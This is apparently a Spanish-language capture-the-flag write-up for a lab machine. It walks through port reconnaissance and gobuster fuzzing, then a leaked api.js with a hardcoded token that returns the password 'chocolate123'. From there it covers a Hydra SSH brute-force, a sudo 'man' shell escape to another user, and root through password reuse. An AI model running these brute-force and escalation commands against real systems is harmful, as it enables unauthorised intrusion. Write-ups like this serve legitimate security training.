## Reconocimiento:

Puerto 22 : SSH 

Puerto 80 : HTTP

Puerto 3000 : Node.js

A simple vista no encuentro nada, así que le aplico un fuzzing al puerto 80 agregando la extensión js ya que sabemos que hay un servicio del mismo:

```bash
gobuster dir -u URL -w /usr/share/wordlists/dirbuster/directory-list.txt -x php,html,txt,zip,js
```

Encuentro **api.js** con el siguiente contenido:

```bash
const express = require('express');
const app = express();
const PORT = 3000;

const tokenValido = "EKL56L4K57657JÃ‘456J74K5Ã‘6754";

app.use(express.json());

app.post('/api', (req, res) => {
  const { token } = req.body;

  if (token === tokenValido) {
    return res.send("âœ… Acceso concedido. ContraseÃ±a chocolate123");
  } else {
    return res.status(401).send("âŒ Token invÃ¡lido.");
  }
});

app.listen(PORT, () => {
  console.log(`ðŸš€ API activa en http://localhost:${PORT}`);
});
```

Pero si hubiera hecho esto también serviría:

```bash
curl -X POST http://<IP>:3000/api \
  -H 'Content-Type: application/json' \
  -d '{"token":"EKL56L4K57657JÑ456J74K5Ñ6754"}'
```

Sabiendo que chocolate123 es una contraseña y que hay un servicio SSH, pruebo un ataque de fuerza bruta a usuarios con Hydra:

```bash
hydra -L <WORDLIST> -p chocolate123 ssh://<IP> -t 64 -I
```

Encuentro el user : admin

## Escalada admin → balulito

```bash
sudo -l
(balulito) NOPASSWD: /usr/bin/man
```

Exploto el binario:

```bash
sudo -u balulito man man
!/bin/bash
```

## Escalada balulito → root

Desgraciadamente no hay una técnica padre para esto, ya que la contraseña de root es la misma que la de admin.

```bash
su root
# pass:chocolate123
```

Listo.
